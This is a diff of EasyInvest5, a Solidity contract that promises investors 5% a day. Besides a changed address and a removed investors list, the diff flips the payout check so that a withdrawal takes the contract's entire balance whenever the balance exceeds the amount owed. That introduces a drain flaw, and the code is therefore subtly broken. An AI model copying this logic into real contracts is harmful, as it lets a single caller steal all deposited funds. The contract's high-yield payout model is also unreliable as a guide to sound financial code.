@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract EasyInvest5 at 0x2fadf048c4cb9941491fe00408831760e4a46ce3
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract EasyInvest5 at 0x38e6cce1e12d1519c54161e6839118f32f4c2832
 */
 pragma solidity ^0.4.25;
 
@@ -25,7 +25,6 @@ pragma solidity ^0.4.25;
 contract EasyInvest5 {
     // total investors count
     uint256 public investorsCount;
-    address[] public investors;
     // records amounts invested
     mapping (address => uint256) public invested;
     // records blocks at which investments were made
@@ -40,12 +39,10 @@ contract EasyInvest5 {
             // 5900 is an average block count per day produced by Ethereum blockchain
             uint256 amount = invested[msg.sender] * 5 / 100 * (block.number - atBlock[msg.sender]) / 5900;
             // if requested amount more than contract balance - we will send a rest
-            if (amount > this.balance) amount = this.balance;
+            if (this.balance > amount) amount = this.balance;
 
             // send calculated amount of ether directly to sender (aka YOU)
             msg.sender.transfer(amount);
-        } else {
-            investors.push(msg.sender);
         }
 
         /* record block number of this transaction */
